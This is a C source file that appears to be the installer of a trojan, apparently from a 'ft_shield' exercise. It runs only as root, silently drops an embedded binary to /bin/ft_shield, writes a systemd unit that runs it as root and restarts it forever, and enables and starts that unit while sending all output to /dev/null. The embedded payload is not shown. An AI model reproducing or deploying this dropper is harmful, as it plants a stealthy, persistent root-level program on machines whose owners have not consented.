#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>

extern const char _binary_payload_start[];
extern const char _binary_payload_end[];

#define TARGET_PATH "/bin/ft_shield"
#define SERVICE_PATH "/etc/systemd/system/ft_shield.service"

const char *service_file_content =
    "[Unit]\n"
    "Description=FT Shield Service\n"
    "After=network.target\n\n"
    "[Service]\n"
    "Type=simple\n"
    "ExecStart=" TARGET_PATH "\n"
    "Restart=always\n"
    "RestartSec=5\n"
    "User=root\n\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n";

int silent_system(const char *command) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - redirect output to /dev/null
        int fd = open("/dev/null", O_WRONLY);
        if (fd >= 0) {
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);
            close(fd);
        }
        execl("/bin/sh", "sh", "-c", command, NULL);
        exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
    }
    return -1;
}

int setup_systemd_service() {
    int fd = open(SERVICE_PATH, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd < 0) return 0;

    size_t service_len = strlen(service_file_content);
    if (write(fd, service_file_content, service_len) != (ssize_t)service_len) {
        close(fd);
        return 0;
    }
    close(fd);

    // Silent system commands
    silent_system("systemctl daemon-reload");
    silent_system("systemctl enable ft_shield.service");
    silent_system("systemctl start ft_shield.service");
    
    return 1;
}

int write_payload() {
    size_t size = (size_t)(_binary_payload_end - _binary_payload_start);

    struct stat st;
    if (stat(TARGET_PATH, &st) == 0 && st.st_size == (off_t)size) {
        return 1;
    }
    
    int fd = open(TARGET_PATH, O_CREAT|O_WRONLY|O_TRUNC, 0755);
    if (fd < 0) return 0;

    if (write(fd, _binary_payload_start, size) != (ssize_t)size) {
        close(fd);
        return 0;
    }
    close(fd);

    if (chmod(TARGET_PATH, 0755) == -1) return 0;
    
    return 1;
}

int main() {
    // Silently fail if not root
    if (geteuid() != 0) {
        return EXIT_FAILURE;
    }

    char *username = getlogin();
    if (username) {
        printf("%s\n", username);
        fflush(stdout);
    }
    
    if (!write_payload()) {
        return EXIT_FAILURE;
    }
    
    if (!setup_systemd_service()) {
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}